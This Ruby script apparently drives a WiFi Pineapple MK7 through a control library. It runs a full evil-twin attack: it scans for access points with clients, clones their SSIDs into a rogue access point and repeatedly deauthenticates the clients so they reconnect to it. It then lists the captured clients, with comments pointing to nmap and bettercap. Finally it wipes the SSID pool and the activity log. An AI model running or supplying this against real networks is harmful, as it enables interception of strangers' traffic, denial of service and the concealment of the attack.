require_relative('../classes/PineappleMK7.rb')
include(PineappleMK7)

system = System.new()
system.host = "172.16.42.1"
system.port = "1471"
system.mac = "00:13:37:DD:EE:FF"
system.password = "P@55w0rD"

puts("[>] Authentication")
logged = system.login()

if (logged)

    pineAP = Modules::PineAP
    recon = Modules::Recon

    puts("[>] PineAP activation")
    pineAP.enable()

    puts("[>] Beginning of the discovery for 240 seconds")
    scan = recon.startScan(240)
    scanID = scan.scanID()

    puts("[>] Recovery of results")
    getResults = recon.getResults(scanID)

    puts("[@] Access Points With Client(s)")
    apResults = (getResults.APResults().nil?() === false) ? getResults.APResults() : []
    aps = []
    apResults.each() do |ap|

        clients = ap.clients()

        if (clients.nil?() === false)

            puts("[+] SSID: " + ap.ssid())
            puts("[+] BSSID: " + ap.bssid())
            puts("[+] Channel: " + ap.channel().to_s())

            clientsMAC = []
            clients.each() do |client|
                puts("[++] Client: " + client.client_mac())
                clientsMAC << client.client_mac()
            end

            aps << {
                'bssid' => ap.bssid(),
                'channel' => ap.channel(),
                'clients' => clientsMAC
            }

            puts("[~] Adding '#{ap.ssid()}' SSID to the pool")
            pineAP.addSSID(ap.ssid())
        
        end

    end

    puts("[>] PineAP deactivation")
    pineAP.disable()

    puts("[>] Cleaning up the results")
    recon.deleteScan(scanID)

    puts("[>] Filtering by client(s) rejection")
    pineAP.filterClient("deny")

    puts("[>] Filtering by SSID(s) rejection")
    pineAP.filterSSID("deny")

    puts("[>] PineAP activation with rogue settings")
    pineAP.setRogue()

    puts("[>] Awaiting connections")

    30.times() do

        aps.each() do |ap|
            puts("[+] Deauthentication of client(s) for #{ap['bssid']}")
            pineAP.deauthAP(ap['bssid'], ap['channel'], ap['clients'])
        end

        clients = (pineAP.getClients().nil?() === false) ? pineAP.getClients() : []
        clients.each() do |client|
            puts("[+] Client connected on '#{client.ssid()}' : #{client.ip()} - #{client.mac()}")
            # nmap
            # bettercap
        end

        sleep(20)

    end

    puts("[>] PineAP deactivation")
    pineAP.disable()

    puts("[>] Filtering by client(s) authorization")
    pineAP.filterClient("allow")

    puts("[>] Filtering by SSID(s) authorization")
    pineAP.filterSSID("allow")

    puts("[>] SSID(s) Pool cleaning")
    pineAP.clearPool()

    puts("[>] Activity Log cleaning")
    pineAP.clearActivity()

end